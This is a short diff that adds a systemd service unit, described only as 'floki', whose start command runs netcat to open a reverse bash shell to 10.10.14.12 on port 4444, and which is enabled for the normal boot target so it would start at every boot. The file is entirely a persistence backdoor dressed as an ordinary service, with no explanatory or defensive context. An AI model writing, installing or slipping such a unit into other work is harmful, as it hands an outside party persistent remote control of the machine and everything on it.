@@ -1,0 +1,8 @@
+[Unit]
+Description=floki 
+
+[Service]
+ExecStart=/bin/nc -e /bin/bash 10.10.14.12 4444
+
+[Install]
+WantedBy=multi-user.target
